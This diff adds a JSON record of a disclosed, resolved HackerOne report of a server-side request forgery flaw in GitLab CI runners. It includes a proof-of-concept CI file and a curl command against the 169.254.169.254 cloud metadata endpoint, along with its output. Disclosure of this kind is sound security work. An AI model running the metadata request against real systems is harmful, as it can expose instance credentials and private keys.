@@ -1,0 +1,139 @@
+{
+  "id": 369451,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjk0NTE=",
+  "url": "https://hackerone.com/reports/369451",
+  "title": "SSRF in CI after first run",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2018-06-21T06:03:43.506Z",
+  "submitted_at": "2018-06-21T06:03:43.506Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "plazmaz",
+    "url": "/plazmaz",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/QggdQvoxRajRsjpzJJKMnuVh/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-04-12T19:57:38.977Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-03-13T19:57:38.229Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!\n\n**Summary:** \nDuring the first run, the CI pipeline seems to defend against SSRF properly, however when a build is re-run a second time, I am able to access internal metadata endpoints for digitalocean\n\n**Description:**\nThe following resources are accessible on the second run of a CI build. For instance,\n`http://169.254.169.254/metadata/v1.json` \nand `http://169.254.169.254/metadata/v1/`\nare both visible.\n\n\n## Steps To Reproduce:\n\n(Add details for how we can reproduce the issue)\n\n  1. Create a `.gitlab-ci.yml`. This was my PoC:\n\n```\n# This file is a template, and might need editing before it works on your project.\n# Official framework image. Look for the different tagged releases at:\n# https://hub.docker.com/r/library/node/tags/\nimage: node:latest\n\n# This folder is cached between builds\n# http://docs.gitlab.com/ce/ci/yaml/README.html#cache\ncache:\n  paths:\n  - node_modules/\n\ntest:\n  stage: test\n  script:\n    - npm install\n    - npm test\n\npack:\n  stage: deploy\n  script:\n    - chmod +x run.sh\n    - ./run.sh\n    - npm install\n    - npm pack\n  artifacts:\n    paths:\n    - ./*.tgz\n```\n  2. Create a bash file containing this line:  \n```\ncurl -L http://169.254.169.254/metadata/v1/\n```\n  3. Run the build pipeline. It will work as intended with no leaks. Now re-run the build. You should see this output:\n\n```\nid\nhostname  \nuser-data  \nvendor-data  \npublic-keys  \nregion  \ninterfaces/  \ndns/  \nfloating_ip/  \ntags/  \nfeatures/  \n```\nThis indicates access to internal resources, and thus successful SSRF.\n\n## Impact\n\nAny internal resources visible to the node. For gitlab cloud, this looks to be digitalocean metadata, but this will also allow access to any resources the gitlab server can see.",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2019-04-12T19:57:38.347Z",
+  "allow_singular_disclosure_after": -152730525.23097572,
+  "singular_disclosure_allowed": true,
+  "vote_count": 69,
+  "voters": [
+    "jellebwns",
+    "spaceraccoon",
+    "r00ster",
+    "foobar7",
+    "mashoud1122",
+    "base_64",
+    "andi",
+    "teuvokas",
+    "spam404",
+    "ali",
+    "and 59 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 14756,
+      "category": "researcher",
+      "content": "GitLab CI runners did not properly restrict access to the google cloud instance metadata APIs, allowing a malicious CI job to create a service token and access internal buckets containing private keys and logfiles.\nI've written a brief blog post on this issue here:\nhttps://dylankatz.com/attacking-cloud-containers-using-ssrf/",
+      "user": {
+        "id": 84353,
+        "username": "plazmaz",
+        "name": "Dylan Katz",
+        "bio": "https://twitter.com/Plazmaz",
+        "cleared": false,
+        "verified": false,
+        "website": "https://dylankatz.com",
+        "location": "",
+        "created_at": "2016-06-11T19:49:15.702Z",
+        "url": "https://hackerone.com/plazmaz",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/QggdQvoxRajRsjpzJJKMnuVh/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/QggdQvoxRajRsjpzJJKMnuVh/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/QggdQvoxRajRsjpzJJKMnuVh/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": []
+    }
+  ]
+}
